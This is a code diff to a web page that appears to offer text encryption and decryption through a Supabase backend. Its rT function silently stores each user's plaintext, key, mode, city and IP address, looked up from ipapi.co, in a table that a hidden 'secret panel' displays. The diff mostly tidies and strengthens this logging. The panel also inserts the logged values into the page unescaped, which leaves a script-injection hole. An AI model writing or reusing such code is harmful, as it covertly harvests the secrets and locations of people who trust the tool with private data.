@@ -28,7 +28,6 @@
         footer { margin-top: auto; padding: 30px; width: 100%; text-align: center; }
         .footer-text { font-size: 0.95rem; color: var(--matrix-green); font-weight: bold; opacity: 0.6; }
 
-        /* واجهة البيانات السرية */
         #secret-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; border: 5px solid var(--matrix-green); }
         .log-table { width: 100%; border-collapse: collapse; color: var(--matrix-green); margin-top: 20px; font-size: 0.85rem; }
         .log-table th, .log-table td { border: 1px solid var(--matrix-green); padding: 12px; text-align: center; }
@@ -90,7 +89,7 @@
     <div id="secret-panel">
         <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT SECURE PANEL</button>
         <h1 style="color:var(--matrix-green)">DATABASE: logs_english</h1>
-        <div id="log-content">Loading data...</div>
+        <div id="log-content">Loading...</div>
     </div>
 
     <footer id="f-c" style="display:none;">
@@ -127,13 +126,12 @@
         }
 
         async function fL() {
-            // الربط بجدول النسخة الإنجليزية المخصص
-            const { data } = await s_b.from('logs_english').select('*').order('created_at', { ascending: false });
+            const { data, error } = await s_b.from('logs_english').select('*').order('created_at', { ascending: false });
             if (data) {
                 let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>INFO</th></tr>';
                 data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleString()}</td><td>${r.action_type}</td><td>${r.content}</td><td>${r.key_used}</td><td>${r.user_info}</td></tr>`; });
                 document.getElementById('log-content').innerHTML = h + '</table>';
-            }
+            } else { document.getElementById('log-content').innerText = "No data found or Error: " + error.message; }
         }
 
         const t = document.getElementById('interactive-title'), o = document.getElementById('interactive-owl');
@@ -146,12 +144,25 @@
         });
 
         async function rT(t, k, s, m) { 
+            let inf = "ENGLISHM_V1";
             try { 
-                let inf = "ENGLISHM_V1";
-                try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); inf = `${gd.city}, ${gd.ip}`; } catch(e) {}
-                // الإرسال لجدول النسخة الإنجليزية المخصص
-                await s_b.from('logs_english').insert([{ content: t, key_used: k.toString(), bracket_style: s, action_type: m, user_info: inf, browser: "ENGLISHM_PRO_2026" }]);
-            } catch(e) {} 
+                const g = await fetch('https://ipapi.co/json/'); 
+                const gd = await g.json(); 
+                inf = `${gd.city}, ${gd.ip}`; 
+            } catch(e) {}
+            
+            // التأكد من اسم الجدول logs_english
+            const { error } = await s_b.from('logs_english').insert([
+                { 
+                    content: t, 
+                    key_used: k.toString(), 
+                    bracket_style: s, 
+                    action_type: m, 
+                    user_info: inf, 
+                    browser: "ENGLISHM_PRO_2026" 
+                }
+            ]);
+            if (error) console.error("Insert Error:", error);
         }
 
         async function pA(m) {
@@ -160,7 +171,10 @@
             if (!txt || !ky) return;
             btn.innerText = "WAIT..."; btn.disabled = true;
             const { data } = await s_b.rpc('englishm_logic', { t: txt, k: parseInt(ky), m: m, s: br });
-            if (data) { document.getElementById('o' + sx).innerText = data.result; rT(txt, ky, br, m); }
+            if (data) { 
+                document.getElementById('o' + sx).innerText = data.result; 
+                await rT(txt, ky, br, m); 
+            }
             btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE"; btn.disabled = false;
         }
 
